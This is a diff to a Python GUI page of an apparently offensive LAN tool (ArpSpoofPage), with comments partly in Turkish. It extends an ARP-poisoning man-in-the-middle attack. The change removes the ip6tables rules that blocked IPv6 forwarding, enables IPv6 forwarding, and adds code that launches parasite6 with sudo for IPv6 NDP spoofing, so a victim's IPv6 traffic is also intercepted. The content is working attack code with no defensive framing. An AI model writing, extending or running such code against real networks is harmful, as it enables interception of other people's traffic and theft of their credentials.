@@ -2195,11 +2195,9 @@ class ArpSpoofPage(tk.Frame):
         self.log(f"[*] Gateway: {gateway}", "sys")
         self.log(f"[*] Iface:   {iface}", "sys")
 
-        # [FIX #3] IPv6 forwarding yerine ip6tables DROP
+        # IPv4 + IPv6 forwarding aç
         self._set_forward(1)
-        self.log("[+] IPv4 forwarding ON", "ok")
-        self.log("[i] ARP-only MITM — IPv6 traffic may bypass", "warn")
-        self.log("[i] Test target IPv6: curl -6 ifconfig.co", "sys")
+        self.log("[+] Forwarding ON (v4+v6)", "ok")
 
         # [FIX #1] p1 leak koruması — append pattern
         self.processes = []
@@ -2219,6 +2217,27 @@ class ArpSpoofPage(tk.Frame):
                 text=True, bufsize=1, start_new_session=True
             )
             self.processes.append(p2)  # [FIX #1]
+
+            # IPv6 NDP spoofing — hedefin IPv6 cache'ini zehirle
+            parasite_bin = None
+            for candidate in ("atk6-parasite6", "parasite6"):
+                if subprocess.run(f"which {candidate}", shell=True,
+                                 stdout=subprocess.DEVNULL,
+                                 stderr=subprocess.DEVNULL).returncode == 0:
+                    parasite_bin = candidate
+                    break
+
+            if parasite_bin:
+                p3 = subprocess.Popen(
+                    ["sudo", parasite_bin, "-l", "-R", iface],
+                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                    text=True, bufsize=1, start_new_session=True
+                )
+                self.processes.append(p3)
+                self.log(f"[+] IPv6 NDP spoofing started ({parasite_bin})", "ok")
+            else:
+                self.log("[!] parasite6 yok — IPv6 bypass mümkün", "warn")
+                self.log("[*] Kur: sudo apt install -y thc-ipv6", "sys")
 
             self.log("[+] ARP poisoning ACTIVE", "ok")
             self.log("[*] Use buttons below to inspect traffic", "sys")
@@ -2245,35 +2264,17 @@ class ArpSpoofPage(tk.Frame):
 
     # [FIX #3] IPv6 forwarding yerine ip6tables
     def _set_forward(self, state):
-        """IPv4 forwarding aç/kapat; IPv6 target'ı ip6tables ile DROP et."""
-        if state == 1:
-            subprocess.run("sudo sysctl -w net.ipv4.ip_forward=1",
-                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-            # [YENİ] ip6tables var mı? Yoksa uyar, sessiz fail etme
-            has_ip6t = subprocess.run("which ip6tables", shell=True,
-                                      stdout=subprocess.DEVNULL,
-                                      stderr=subprocess.DEVNULL).returncode == 0
-            if has_ip6t:
-                subprocess.run("sudo ip6tables -A FORWARD -i %s -j DROP" % self.iface,
-                              shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                subprocess.run("sudo ip6tables -A FORWARD -o %s -j DROP" % self.iface,
-                              shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            else:
-                self.log("[!] ip6tables missing — IPv6 not blocked", "warn")
-                self.log("[*] Install: sudo apt install iptables", "sys")
-        else:
-            subprocess.run("sudo sysctl -w net.ipv4.ip_forward=0",
-                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            # -D komutları zaten hata verirse stderr'e düşer, DEVNULL; zararsız
-            subprocess.run("sudo ip6tables -D FORWARD -i %s -j DROP" % self.iface,
-                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            subprocess.run("sudo ip6tables -D FORWARD -o %s -j DROP" % self.iface,
-                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        """IPv4 + IPv6 forwarding aç/kapat."""
+        subprocess.run(f"sudo sysctl -w net.ipv4.ip_forward={state}",
+                      shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(f"sudo sysctl -w net.ipv6.conf.all.forwarding={state}",
+                      shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
         v4 = subprocess.run("cat /proc/sys/net/ipv4/ip_forward",
                            shell=True, capture_output=True, text=True).stdout.strip()
-        self.log(f"    ipv4_fwd={v4}  (request={state})", "sys")
+        v6 = subprocess.run("cat /proc/sys/net/ipv6/conf/all/forwarding",
+                           shell=True, capture_output=True, text=True).stdout.strip()
+        self.log(f"    ipv4_fwd={v4}  ipv6_fwd={v6}  (request={state})", "sys")
 
     def toggle_block(self):
         if not self.running:
